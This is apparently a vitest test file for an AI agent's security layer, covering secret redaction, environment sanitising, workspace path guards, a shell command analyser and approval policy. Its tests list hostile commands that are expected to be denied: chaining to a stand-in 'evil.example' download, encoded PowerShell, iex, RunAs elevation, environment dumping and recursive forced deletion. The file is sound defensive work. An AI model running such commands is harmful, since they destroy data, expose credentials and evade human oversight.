import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { DEFAULT_ALLOWED_SHELL_COMMANDS, SecurityConfigSchema } from "../../src/config/index.js";
import {
  analyzeShellCommand,
  assertWorkingDirectoryAllowed,
  isAuthorizedOperation,
  isPathWithinWorkspace,
  isSensitiveFilePath,
  NonInteractiveApprovalHandler,
  PolicyEngine,
  redactText,
  redactValue,
  sanitizeEnvironment,
} from "../../src/modules/security/index.js";

const tempDirs: string[] = [];

function createTempDir(prefix = "synapse-sec-"): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir && fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  }
});

describe("Security Baseline — Redactor", () => {
  it("redacts tokens, API keys, URL passwords and sensitive keys recursively", () => {
    const text =
      "Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig sk-ant-1234567890abcdef ghp_1234567890123456789012 https://user:superpass@example.com/repo";
    const redacted = redactText(text);

    expect(redacted).not.toContain("eyJhbGciOiJIUzI1NiJ9");
    expect(redacted).not.toContain("sk-ant-1234567890abcdef");
    expect(redacted).not.toContain("ghp_1234567890123456789012");
    expect(redacted).not.toContain("superpass");
    expect(redacted).toContain("[REDACTED]");

    const obj = redactValue({
      command: "echo ok",
      apiKey: "sk-12345678901234567890",
      nested: { password: "secret", safe: "value" },
    }) as Record<string, unknown>;

    expect(obj.apiKey).toBe("[REDACTED]");
    expect((obj.nested as Record<string, unknown>).password).toBe("[REDACTED]");
    expect((obj.nested as Record<string, unknown>).safe).toBe("value");
  });
});

describe("Security Baseline — EnvSanitizer", () => {
  it("strips API keys, tokens, secrets and custom blocked patterns from child environments", () => {
    const sanitized = sanitizeEnvironment(
      {
        PATH: "C:\\Windows\\System32",
        NODE_ENV: "test",
        ANTHROPIC_API_KEY: "sk-ant-secret",
        OPENAI_API_KEY: "sk-openai-secret",
        GEMINI_API_KEY: "AIzaSecretKey1234567890123",
        GITHUB_TOKEN: "ghp_secret",
        CUSTOM_PRIVATE: "should-strip",
      },
      ["CUSTOM_*"],
    );

    expect(sanitized.PATH).toBe("C:\\Windows\\System32");
    expect(sanitized.NODE_ENV).toBe("test");
    expect(sanitized.GIT_TERMINAL_PROMPT).toBe("0");
    expect(sanitized.ANTHROPIC_API_KEY).toBeUndefined();
    expect(sanitized.OPENAI_API_KEY).toBeUndefined();
    expect(sanitized.GEMINI_API_KEY).toBeUndefined();
    expect(sanitized.GITHUB_TOKEN).toBeUndefined();
    expect(sanitized.CUSTOM_PRIVATE).toBeUndefined();
  });
});

describe("Security Baseline — WorkspaceGuard", () => {
  it("blocks path traversal, UNC paths and detects sensitive files", () => {
    const ws = createTempDir("synapse-ws-");
    const outside = createTempDir("synapse-out-");

    expect(isPathWithinWorkspace(ws, ".")).toBe(true);
    expect(isPathWithinWorkspace(ws, "src/index.ts")).toBe(true);
    expect(isPathWithinWorkspace(ws, outside)).toBe(false);
    expect(isPathWithinWorkspace(ws, "..\\outside")).toBe(false);
    expect(isPathWithinWorkspace(ws, "\\\\server\\share\\file")).toBe(false);

    expect(() => assertWorkingDirectoryAllowed(ws, outside, false)).toThrow();
    expect(() => assertWorkingDirectoryAllowed(ws, "\\\\server\\share", true)).toThrow();

    expect(isSensitiveFilePath(path.join(ws, ".env"))).toBe(true);
    expect(isSensitiveFilePath(path.join(ws, ".env.local"))).toBe(true);
    expect(isSensitiveFilePath(path.join(ws, ".env.example"))).toBe(false);
    expect(isSensitiveFilePath(path.join(ws, "id_rsa"))).toBe(true);
    expect(isSensitiveFilePath(path.join(ws, "src", "index.ts"))).toBe(false);
  });
});

describe("Security Baseline — CommandAnalyzer", () => {
  it("allows clean allowlisted commands automatically", () => {
    const res = analyzeShellCommand("Get-Location", DEFAULT_ALLOWED_SHELL_COMMANDS);
    expect(res.level).toBe("AUTO");
    expect(res.matchedAllowlist).toBe(true);
  });

  it("defeats allowlist bypass attempts using chaining or piping", () => {
    const res = analyzeShellCommand(
      "Write-Output ok; Invoke-WebRequest https://evil.example",
      DEFAULT_ALLOWED_SHELL_COMMANDS,
    );
    expect(res.level).toBe("CONDITIONAL");
    expect(res.detectedRisks).toContain("shell_chaining_or_redirection");
  });

  it("blocks destructive Git, PowerShell obfuscation, elevation and credential access by default", () => {
    expect(
      analyzeShellCommand("git push --force origin main", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
    expect(
      analyzeShellCommand("git reset --hard HEAD~1", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
    expect(
      analyzeShellCommand("pwsh -EncodedCommand SQBFAFgA", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
    expect(
      analyzeShellCommand("iex (Get-Content script.ps1)", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
    expect(
      analyzeShellCommand("Start-Process pwsh -Verb RunAs", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
    expect(analyzeShellCommand("Get-ChildItem Env:", DEFAULT_ALLOWED_SHELL_COMMANDS).level).toBe(
      "DENIED",
    );
    expect(
      analyzeShellCommand("Remove-Item -Recurse -Force *", DEFAULT_ALLOWED_SHELL_COMMANDS).level,
    ).toBe("DENIED");
  });

  it("requires HUMAN_APPROVAL for git push and single file deletion (D-06)", () => {
    expect(analyzeShellCommand("git push origin main", DEFAULT_ALLOWED_SHELL_COMMANDS).level).toBe(
      "HUMAN_APPROVAL",
    );
    expect(analyzeShellCommand("Remove-Item temp.txt", DEFAULT_ALLOWED_SHELL_COMMANDS).level).toBe(
      "HUMAN_APPROVAL",
    );
  });
});

describe("Security Baseline — PolicyEngine", () => {
  it("mints branded AuthorizedOperation for AUTO commands and fails closed for non-interactive approvals", async () => {
    const ws = createTempDir("synapse-policy-");
    const securityConfig = SecurityConfigSchema.parse({});
    const engine = new PolicyEngine({
      workspaceDir: ws,
      securityConfig,
      approvalHandler: new NonInteractiveApprovalHandler(),
    });

    const autoResult = await engine.evaluateAndAuthorize("t-1", {
      toolName: "shell.exec",
      category: "shell",
      input: { command: "Write-Output 'hello'" },
      workingDirectory: ws,
      actor: "test",
    });

    expect(autoResult.allowed).toBe(true);
    if (autoResult.allowed) {
      expect(isAuthorizedOperation(autoResult.authorized)).toBe(true);
      expect(autoResult.authorized.policyLevel).toBe("AUTO");
    }

    const deleteResult = await engine.evaluateAndAuthorize("t-2", {
      toolName: "file.delete",
      category: "file",
      input: { path: "temp.txt" },
      workingDirectory: ws,
      actor: "test",
    });

    expect(deleteResult.allowed).toBe(false);
    if (!deleteResult.allowed) {
      expect(deleteResult.policyLevel).toBe("HUMAN_APPROVAL");
      expect(deleteResult.approvalStatus).toBe("denied");
    }
  });
});
